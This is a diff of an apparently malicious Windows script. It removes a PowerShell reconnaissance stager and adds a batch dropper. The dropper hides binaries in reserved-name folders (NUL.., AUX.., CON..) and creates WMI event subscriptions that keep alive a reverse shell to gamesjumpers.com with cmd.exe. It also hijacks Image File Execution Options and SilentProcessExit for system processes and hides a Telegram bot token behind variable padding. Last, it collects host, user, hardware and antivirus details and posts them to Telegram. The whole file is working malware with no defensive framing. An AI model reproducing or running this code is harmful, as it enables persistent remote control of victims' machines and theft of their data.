@@ -1,14 +1,60 @@
-powershell -Command "
-$TOKEN = '7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54';
-$CHAT_ID = '5674938532';
-$ipInfo = Invoke-RestMethod 'http://ip-api.com/csv/?fields=country,query' -UseBasicParsing;
-$country, $ip = $ipInfo -split ',';
-$windows = (Get-WmiObject -Query 'SELECT Caption FROM Win32_OperatingSystem').Caption;
-$cpu = (Get-WmiObject -Query 'SELECT Name FROM Win32_Processor').Name;
-$gpu = (Get-WmiObject -Query 'SELECT Caption FROM Win32_VideoController').Caption;
-$antivirus = (Get-WmiObject -Namespace 'root\SecurityCenter2' -Query 'SELECT displayName FROM AntiVirusProduct').displayName;
-$arch = if (Test-Path Env:ProgramFiles(x86)) {'X64'} else {'X86'};
-$username = $env:USERNAME;
-$worker = $env:COMPUTERNAME;
-$message = '---RUSVKVZ---' + [System.Environment]::NewLine + 'IP: ' + $ip + [System.Environment]::NewLine + 'Country: ' + $country + [System.Environment]::NewLine + 'Worker: ' + $worker + [System.Environment]::NewLine + 'UserName: ' + $username + [System.Environment]::NewLine + 'Windows: ' + $windows + ' ' + $arch + [System.Environment]::NewLine + 'CPU: ' + $cpu + [System.Environment]::NewLine + 'GPU: ' + $gpu + [System.Environment]::NewLine + 'Antivirus: ' + $antivirus;
-Invoke-RestMethod "https://api.telegram.org/bot$TOKEN/sendMessage" -Method POST -Body @{chat_id=$CHAT_ID; text=$message}"
+mkdir \\.\%ProgramData%\NUL..\
+mkdir \\.\%ProgramData%\AUX..\
+mkdir \\.\%ProgramData%\CON..\
+
+move /Y "%ProgramData%\Cedist\DeviceId.dll" "\\.\%ProgramData%\AUX..\"
+copy /Y "%ProgramData%\Cedist\ShellExt.dll" "\\.\%ProgramData%\AUX..\"
+move /Y "%ProgramData%\Cedist\7zxa.dll" "\\.\%ProgramData%\CON..\"
+move /Y "%ProgramData%\Cedist\ShellExt.dll" "\\.\%ProgramData%\CON..\"
+move /Y "%ProgramData%\Cedist\libssl-1_1.dll" "\\.\%ProgramData%\NUL..\"
+move /Y "%ProgramData%\Cedist\vcruntime140.dll" "\\.\%ProgramData%\NUL..\"
+move /Y "%ProgramData%\Cedist\libcrypto-1_1.dll" "\\.\%ProgramData%\NUL..\"
+move /Y "%ProgramData%\Cedist\StartMenuExperienceHost.exe" "\\.\%ProgramData%\NUL..\"
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="nut", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="nut", CommandLineTemplate="%ProgramData%\NUL..\StartMenuExperienceHost.exe --ssl gamesjumpers.com 5252 -e cmd.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"nut\"", Consumer="CommandLineEventConsumer.Name=\"nut\""
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="nur", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="nur", CommandLineTemplate="\\.\%ProgramData%\CON..\ShellExt.dll \\.\%ProgramData%\CON..\7zxa.dll"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"nur\"", Consumer="CommandLineEventConsumer.Name=\"nur\""
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="pers", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="pers", CommandLineTemplate="\\.\%ProgramData%\AUX..\ShellExt.dll \\.\%ProgramData%\AUX..\DeviceId.dll"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"pers\"", Consumer="CommandLineEventConsumer.Name=\"pers\""
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\CON..\ShellExt.dll \\.\%ProgramData%\CON..\7zxa.dll" /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhostw.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhostw.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhostw.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\CON..\ShellExt.dll \\.\%ProgramData%\CON..\7zxa.dll" /f /reg:64
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TiWorker.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\TiWorker.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\TiWorker.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\AUX..\ShellExt.dll \\.\%ProgramData%\AUX..\DeviceId.dll" /f /reg:64
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MoUsoCoreWorker.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\MoUsoCoreWorker.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\MoUsoCoreWorker.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\AUX..\ShellExt.dll \\.\%ProgramData%\AUX..\DeviceId.dll" /f /reg:64
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\AUX..\ShellExt.dll \\.\%ProgramData%\AUX..\DeviceId.dll" /f /reg:64
+
+setlocal EnableDelayedExpansion
+%L OC Z%s%HV XRS%e%IRZJAI%t "%MLZIIQ%T%VQJYZT%O%CVJSVA%K% SZKAD%E%WYEOEY%N=% DPXSM%6%MDSZIJ%5%PJWHUX%7%IRWZKJ%4%JBKWNK%1%LHMMYW%7%DGCYFS%6%IBJQWS%6%HOEIFN%3%BBTGNQ%1:%BRRINB%A%YCLADO%A%ULMERI%G% UFTOZ%2%GDBZLX%r%CXTMXP%N%BAPIST%z%GHKQOV%G%BXKKHT%c%LICSCJ%u% ZSOYG%m%VHPYDQ%7%URCMMH%O%PQQGYO%K%NSQABO%p%MKZGJU%I%BTJDWG%N%GEUVRR%Y%RZXWCM%8%TTBDBG%C%RVGBLU%y%SOIJLU%c%ZLVKAU%y%VSBZKD%6%SRHMNQ%t%SYRDMA%F% FT CC%r%JHNCXS%H%SITIJJ%b%ESLDJV%J%NFBTRO%a%DVZULW%a%AVPZQC%T%QPUPUF%A%YKPHZV%Y"
+%QXWZNY%s%BQR ZC%e%TZYXHO%t "%UFBJNU%C%BYMWWG%H%ZWXEDO%A%ACISYA%T_%LQRSXV%I%HACANU%D=%THJBXQ%5%MFVKAC%0%GOWJWF%0%GCIBYX%1%DKARPV%0%DZJCMX%6%F FTGT%2%FAQOLI%8% YFYVL%5%MRJMYN%2"
+
+for /f "tokens=1,2 delims=," %%a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (set "Country=%%a" & set "IP=%%b" & echo Country: !Country! & echo IP: !IP!)
+for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value') do set "Windows=%%a"
+for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do set "CPU=%%a"
+for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get caption /value') do set "GPU=%%a"
+set "Antivirus="
+for /f "tokens=2 delims==" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /value') do (if defined Antivirus (set "Antivirus=!Antivirus!, %%a") else (set "Antivirus=%%a"))
+if defined ProgramFiles(x86) (set Arch=X64) else (set Arch=X86)
+set "UserName=%USERNAME%"
+set "Worker=%COMPUTERNAME%"
+set "MESSAGE=---**RUSVKVZ**---%%0AIP: !IP!%%0ACountry: !Country!%%0AWorker: !Worker!%%0AUserName: !UserName!%%0AWindows: !Windows! !Arch!%%0ACPU: !CPU!%%0AGPU: !GPU!%%0AAntivirus: !Antivirus!"
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=%MESSAGE%"
+endlocal
